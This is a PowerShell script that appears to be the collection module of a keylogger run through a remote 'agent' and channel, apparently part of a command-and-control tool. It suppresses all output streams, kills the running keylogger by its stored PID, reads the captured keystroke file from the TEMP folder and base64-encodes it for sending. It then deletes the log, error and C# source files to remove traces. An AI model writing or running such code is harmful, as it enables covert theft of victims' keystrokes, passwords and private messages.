$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
$errorLog = "$env:TEMP\keylog_error_$channelID.txt"
$csharpFile = "$env:TEMP\keylog_csharp_$channelID.cs"

if (Test-Path $pidFile) {
    $pidRunning = Get-Content $pidFile
    Stop-Process -Id $pidRunning -Force -ErrorAction SilentlyContinue
    Remove-Item $pidFile -Force
}

Start-Sleep -Seconds 2

if (Test-Path $logFile) {
    $content = Get-Content $logFile -Raw
    Remove-Item $logFile -Force
    Remove-Item $errorLog -Force -ErrorAction SilentlyContinue
    Remove-Item $csharpFile -Force -ErrorAction SilentlyContinue
    if ($content) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        $base64 = [System.Convert]::ToBase64String($bytes)
        # Write raw base64 bytes to stdout – no newline, no extra characters
        $outBytes = [System.Text.Encoding]::UTF8.GetBytes($base64)
        [System.Console]::OpenStandardOutput().Write($outBytes, 0, $outBytes.Length)
    } else {
        # If no content, output a simple message (not base64, so agent sends as text)
        "No keystrokes recorded."
    }
} else {
    if (Test-Path $errorLog) {
        $errorMsg = Get-Content $errorLog -Raw
        Remove-Item $errorLog -Force
        Remove-Item $csharpFile -Force -ErrorAction SilentlyContinue
        "Keylogger error: $errorMsg"
    } else {
        "Keylogger not running."
    }
}